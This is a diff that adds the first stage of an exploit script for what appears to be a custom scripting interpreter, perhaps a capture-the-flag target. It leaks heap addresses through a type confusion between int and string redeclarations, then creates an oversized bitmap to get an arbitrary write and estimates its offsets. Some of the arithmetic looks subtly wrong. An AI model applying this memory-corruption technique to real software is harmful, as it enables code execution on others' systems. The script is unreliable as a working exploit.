@@ -1,0 +1,43 @@
+print("=== Step 1: Find Variable Entry and Bitmap Buffer Addresses ===");
+
+print("Step 1a: Leak heap addresses");
+int leak1 = 0;
+string leak1 = "marker1";
+int addr1 = leak1;
+print("Leaked address 1:");
+print(addr1);
+
+int leak2 = 0;
+string leak2 = "marker2";
+int addr2 = leak2;
+print("Leaked address 2:");
+print(addr2);
+
+print("Step 1b: Create target variable");
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target string address:");
+print(targetaddr);
+
+print("Step 1c: Estimate variable entry address");
+print("Variable entry is typically 0x200-0x400 bytes before string");
+print("entry_addr ≈ targetaddr - 0x300");
+print("value_ptr_addr = entry_addr + 0x28");
+
+print("Step 1d: Create bitmap for arbitrary write");
+bitmap b1 = create(9223372036854775807, 2);
+print("Bitmap created");
+
+print("Step 1e: Estimate bitmap buffer address");
+print("Bitmap buffer is allocated after variables");
+print("bitmap_data_ptr ≈ targetaddr + 0x1000");
+
+print("Step 1f: Calculate coordinates");
+print("offset = value_ptr_addr - bitmap_data_ptr");
+print("y = (offset * 8) / INT64_MAX");
+print("x = (offset * 8) % 8");
+
+print("Note: These are estimates. Need to refine based on actual heap layout");
+print("Next: Test if we can write to estimated address");
+
